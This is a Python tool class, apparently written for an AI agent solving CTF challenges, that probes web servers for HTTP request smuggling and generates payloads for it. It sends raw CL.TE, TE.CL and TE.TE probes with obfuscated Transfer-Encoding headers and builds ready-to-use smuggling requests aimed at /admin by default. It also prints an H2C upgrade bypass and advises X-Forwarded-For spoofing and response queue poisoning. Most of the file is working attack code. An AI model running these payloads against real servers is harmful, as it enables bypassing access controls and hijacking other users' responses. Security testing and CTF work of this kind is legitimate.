"""
HTTP Request Smuggling detection tools for CTF solving.

Provides utilities for detecting and generating HTTP request smuggling payloads
for CL.TE, TE.CL, TE.TE, and H2C smuggling attacks.
"""

import json
import socket
import time
from typing import Dict, List, Optional, Tuple

import requests


class HttpSmugglingProbeTool:
    """
    HttpSmugglingProbeTool: test for HTTP request smuggling vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "detect",
          "url": "http://target.com/"
        }

    Supported operations:
      - clte_probe: Test for CL.TE smuggling
      - tecl_probe: Test for TE.CL smuggling
      - tete_probe: Test for TE.TE smuggling with obfuscated Transfer-Encoding
      - detect: Auto-detect smuggling type by running all probes
      - payload: Generate a smuggling payload for a confirmed vulnerability type
    """

    name: str = "http_smuggling_probe"
    description: str = (
        "Test for HTTP request smuggling vulnerabilities (CL.TE, TE.CL, TE.TE, H2C). "
        "Input must be JSON with 'operation' (clte_probe, tecl_probe, tete_probe, detect, "
        "payload) and 'url' (target URL). For 'payload' operation, also provide 'type' "
        "(clte or tecl) and 'smuggled_request' (the HTTP request to smuggle). Returns "
        "detection results or ready-to-use smuggling payloads."
    )

    VALID_OPERATIONS = ("clte_probe", "tecl_probe", "tete_probe", "detect", "payload")

    # TE.TE obfuscation variants
    TE_OBFUSCATIONS: List[Tuple[str, str]] = [
        ("Transfer-Encoding: xchunked", "xchunked prefix"),
        ("Transfer-Encoding : chunked", "space before colon"),
        ("Transfer-Encoding: chunked\r\nTransfer-Encoding: x", "duplicate TE header"),
        ("Transfer-Encoding:\tchunked", "tab separator"),
        ("Transfer-Encoding: chunked\r\n", "trailing whitespace"),
        ("X: x\r\nTransfer-Encoding: chunked", "header before TE"),
        ("Transfer-Encoding\r\n : chunked", "newline in header name"),
        ("Transfer-encoding: chunked", "lowercase encoding"),
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[HttpSmugglingProbeTool] Error: Invalid JSON input. {exc}"

        operation = (data.get("operation") or "").strip().lower()
        url = (data.get("url") or "").strip()

        if not operation:
            return (
                "[HttpSmugglingProbeTool] Error: 'operation' is required. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[HttpSmugglingProbeTool] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if not url:
            return "[HttpSmugglingProbeTool] Error: 'url' is required."

        if operation == "clte_probe":
            return self._clte_probe(url, data)
        elif operation == "tecl_probe":
            return self._tecl_probe(url, data)
        elif operation == "tete_probe":
            return self._tete_probe(url, data)
        elif operation == "detect":
            return self._detect(url, data)
        elif operation == "payload":
            return self._generate_payload(data)

        return "[HttpSmugglingProbeTool] Error: Unexpected state."

    def _parse_url(self, url: str) -> Tuple[str, str, int, str, bool]:
        """Parse URL into (scheme, host, port, path, use_ssl)."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname or "localhost"
        use_ssl = scheme == "https"
        default_port = 443 if use_ssl else 80
        port = parsed.port or default_port
        path = parsed.path or "/"
        return scheme, host, port, path, use_ssl

    def _send_raw(self, host: str, port: int, raw_request: bytes, use_ssl: bool, timeout: float = 10.0) -> Tuple[str, float]:
        """Send a raw HTTP request and return (response_text, elapsed_time)."""
        start = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            if use_ssl:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.sendall(raw_request)
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            sock.close()
            elapsed = time.time() - start
            return response.decode("utf-8", errors="replace"), elapsed
        except Exception as exc:
            elapsed = time.time() - start
            return f"ERROR: {exc}", elapsed

    def _clte_probe(self, url: str, data: dict) -> str:
        """Test for CL.TE smuggling."""
        _, host, port, path, use_ssl = self._parse_url(url)
        timeout = data.get("timeout", 10)

        lines = [
            "[HttpSmugglingProbeTool] CL.TE Smuggling Probe",
            "=" * 55,
            f"Target: {url}",
            "",
        ]

        # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
        # Send request where CL says body is short, but TE chunked body is longer
        raw_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "1\r\n"
            "Z\r\n"
            "Q\r\n"  # This should cause an error if TE is processed
        ).encode()

        response, elapsed = self._send_raw(host, port, raw_request, use_ssl, timeout)

        # Also send a normal request for baseline timing
        normal_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        normal_response, normal_elapsed = self._send_raw(host, port, normal_request, use_ssl, timeout)

        lines.append("=== CL.TE Test ===")
        lines.append(f"Normal request time: {normal_elapsed:.3f}s")
        lines.append(f"Smuggle probe time: {elapsed:.3f}s")
        lines.append(f"Time difference: {elapsed - normal_elapsed:.3f}s")
        lines.append("")

        # Analyze results
        is_vulnerable = False
        if elapsed > normal_elapsed + 3.0:
            is_vulnerable = True
            lines.append("[+] POTENTIAL CL.TE SMUGGLING DETECTED!")
            lines.append("    Significant timing difference suggests the back-end")
            lines.append("    processed Transfer-Encoding while the front-end used Content-Length.")
        elif "400" in response[:50] or "error" in response[:200].lower():
            lines.append("[?] Back-end returned error - may indicate TE processing.")
            lines.append(f"    Response start: {response[:100]}")
        else:
            lines.append("[-] No obvious CL.TE smuggling detected.")

        lines.append("")
        lines.append("=== Raw Probe Request ===")
        lines.append(raw_request.decode("utf-8", errors="replace"))

        return "\n".join(lines)

    def _tecl_probe(self, url: str, data: dict) -> str:
        """Test for TE.CL smuggling."""
        _, host, port, path, use_ssl = self._parse_url(url)
        timeout = data.get("timeout", 10)

        lines = [
            "[HttpSmugglingProbeTool] TE.CL Smuggling Probe",
            "=" * 55,
            f"Target: {url}",
            "",
        ]

        # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
        raw_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"  # Extra data that CL would include but TE should not
        ).encode()

        response, elapsed = self._send_raw(host, port, raw_request, use_ssl, timeout)

        # Baseline
        normal_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        normal_response, normal_elapsed = self._send_raw(host, port, normal_request, use_ssl, timeout)

        lines.append("=== TE.CL Test ===")
        lines.append(f"Normal request time: {normal_elapsed:.3f}s")
        lines.append(f"Smuggle probe time: {elapsed:.3f}s")
        lines.append(f"Time difference: {elapsed - normal_elapsed:.3f}s")
        lines.append("")

        is_vulnerable = False
        if elapsed > normal_elapsed + 3.0:
            is_vulnerable = True
            lines.append("[+] POTENTIAL TE.CL SMUGGLING DETECTED!")
            lines.append("    Significant timing difference suggests the front-end")
            lines.append("    processed Transfer-Encoding while the back-end used Content-Length.")
        elif "400" in response[:50] or "error" in response[:200].lower():
            lines.append("[?] Error response - may indicate differential parsing.")
            lines.append(f"    Response start: {response[:100]}")
        else:
            lines.append("[-] No obvious TE.CL smuggling detected.")

        lines.append("")
        lines.append("=== Raw Probe Request ===")
        lines.append(raw_request.decode("utf-8", errors="replace"))

        return "\n".join(lines)

    def _tete_probe(self, url: str, data: dict) -> str:
        """Test for TE.TE smuggling with obfuscated Transfer-Encoding."""
        _, host, port, path, use_ssl = self._parse_url(url)
        timeout = data.get("timeout", 10)

        lines = [
            "[HttpSmugglingProbeTool] TE.TE Smuggling Probe (Obfuscated TE)",
            "=" * 60,
            f"Target: {url}",
            "",
            "Testing obfuscated Transfer-Encoding headers to find differences",
            "between front-end and back-end TE parsing.",
            "",
        ]

        # Baseline
        normal_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        _, normal_elapsed = self._send_raw(host, port, normal_request, use_ssl, timeout)

        findings = []
        for te_variant, description in self.TE_OBFUSCATIONS:
            raw_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                f"{te_variant}\r\n"
                "\r\n"
                "1\r\n"
                "Z\r\n"
                "Q\r\n"
            ).encode()

            response, elapsed = self._send_raw(host, port, raw_request, use_ssl, timeout)

            result = {
                "variant": description,
                "te_header": te_variant.split("\r\n")[0],
                "elapsed": elapsed,
                "time_diff": elapsed - normal_elapsed,
                "response_start": response[:80].replace("\r\n", " | "),
            }

            if elapsed > normal_elapsed + 3.0:
                result["status"] = "POTENTIAL"
                findings.append(result)
                lines.append(f"[+] {description}: {elapsed:.3f}s (diff: {elapsed - normal_elapsed:.3f}s) -> POTENTIAL")
            elif "400" in response[:20]:
                result["status"] = "ERROR"
                lines.append(f"[?] {description}: Error response (400)")
            else:
                result["status"] = "SAFE"
                lines.append(f"[-] {description}: {elapsed:.3f}s -> No indication")

        lines.append("")

        if findings:
            lines.append(f"=== POTENTIAL TE.TE FINDINGS ({len(findings)}) ===")
            for f in findings:
                lines.append(f"  Variant: {f['variant']}")
                lines.append(f"  Header: {f['te_header']}")
                lines.append(f"  Time diff: {f['time_diff']:.3f}s")
                lines.append("")
        else:
            lines.append("[-] No TE.TE smuggling variants detected.")

        return "\n".join(lines)

    def _detect(self, url: str, data: dict) -> str:
        """Run all probes and summarize results."""
        lines = [
            "[HttpSmugglingProbeTool] Auto-Detect Smuggling Type",
            "=" * 55,
            f"Target: {url}",
            "",
            "Running CL.TE, TE.CL, and TE.TE probes...",
            "",
        ]

        clte_result = self._clte_probe(url, data)
        tecl_result = self._tecl_probe(url, data)
        tete_result = self._tete_probe(url, data)

        detected = []
        if "POTENTIAL CL.TE SMUGGLING DETECTED" in clte_result:
            detected.append("CL.TE")
        if "POTENTIAL TE.CL SMUGGLING DETECTED" in tecl_result:
            detected.append("TE.CL")
        if "POTENTIAL TE.TE FINDINGS" in tete_result:
            detected.append("TE.TE")

        lines.append("=== Individual Probe Results ===")
        lines.append("")
        lines.append("--- CL.TE ---")
        lines.append(clte_result)
        lines.append("")
        lines.append("--- TE.CL ---")
        lines.append(tecl_result)
        lines.append("")
        lines.append("--- TE.TE ---")
        lines.append(tete_result)
        lines.append("")

        lines.append("=== SUMMARY ===")
        if detected:
            lines.append(f"[!] Potential smuggling detected: {', '.join(detected)}")
            lines.append("")
            lines.append("NEXT STEPS:")
            lines.append("1. Use 'payload' operation with the detected type to generate a smuggling request")
            lines.append("2. Try smuggling a request to /admin or other restricted paths")
            lines.append("3. Try smuggling with internal headers (X-Forwarded-For: 127.0.0.1)")
            lines.append("4. Check for response queue poisoning")
        else:
            lines.append("[-] No smuggling detected with standard probes.")
            lines.append("")
            lines.append("NEXT STEPS:")
            lines.append("1. Try with different paths")
            lines.append("2. Check if H2C upgrade is available")
            lines.append("3. Try HTTP/2 downgrade smuggling")
            lines.append("4. Check the CTF knowledge base for smuggling techniques")

        return "\n".join(lines)

    def _generate_payload(self, data: dict) -> str:
        """Generate a smuggling payload for a confirmed vulnerability type."""
        smuggle_type = (data.get("type") or "").strip().lower()
        url = (data.get("url") or "").strip()
        smuggled_request = data.get("smuggled_request", "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n")

        if smuggle_type not in ("clte", "tecl"):
            return (
                "[HttpSmugglingProbeTool] Error: 'type' must be 'clte' or 'tecl' "
                "for payload generation."
            )
        if not url:
            return "[HttpSmugglingProbeTool] Error: 'url' is required for payload generation."

        _, host, port, path, _ = self._parse_url(url)

        lines = [
            f"[HttpSmugglingProbeTool] {smuggle_type.upper()} Smuggling Payload",
            "=" * 55,
            f"Target: {url}",
            f"Type: {smuggle_type.upper()}",
            "",
        ]

        if smuggle_type == "clte":
            # CL.TE: front-end uses CL, back-end uses TE
            # We set CL to cover the first chunk, but TE chunked body contains the smuggled request
            smuggled_bytes = smuggled_request.encode()
            chunk_size = len(smuggled_bytes)
            body = (
                f"0\r\n"
                f"\r\n"
                f"{smuggled_request}"
            )
            content_length = len("0\r\n\r\n")  # CL covers just the "0\r\n\r\n" part

            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )

            lines.append("=== CL.TE Payload ===")
            lines.append("Front-end reads Content-Length bytes, passes rest to back-end.")
            lines.append("Back-end sees chunked encoding, processes chunk 0 (end), then")
            lines.append("treats the smuggled request as the start of the next request.")
            lines.append("")
            lines.append(payload)

        elif smuggle_type == "tecl":
            # TE.CL: front-end uses TE, back-end uses CL
            smuggled_bytes = smuggled_request.encode()
            # Chunk the smuggled request
            hex_len = hex(len(smuggled_bytes))[2:]
            body = (
                f"{hex_len}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            # CL is set shorter than the full chunked body
            content_length = len(smuggled_bytes) + len(hex_len) + 2  # partial

            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )

            lines.append("=== TE.CL Payload ===")
            lines.append("Front-end processes Transfer-Encoding (chunked), passes to back-end.")
            lines.append("Back-end uses Content-Length, reads only part of the body,")
            lines.append("leaving the smuggled request for the next connection.")
            lines.append("")
            lines.append(payload)

        lines.append("")
        lines.append("=== H2C Upgrade Smuggling (bonus) ===")
        lines.append(f"GET {path} HTTP/1.1")
        lines.append(f"Host: {host}")
        lines.append("Connection: Upgrade, HTTP2-Settings")
        lines.append("Upgrade: h2c")
        lines.append("HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA")
        lines.append("")
        lines.append("If the proxy forwards the Upgrade header, you can bypass ACLs")
        lines.append("by speaking HTTP/2 directly to the back-end.")
        lines.append("")
        lines.append("USAGE:")
        lines.append("1. Send this payload via raw socket (not through requests library)")
        lines.append("2. Monitor subsequent responses for the smuggled request's response")
        lines.append("3. For response queue poisoning, send then make a normal request")
        lines.append("4. The normal request should receive the smuggled request's response")

        return "\n".join(lines)
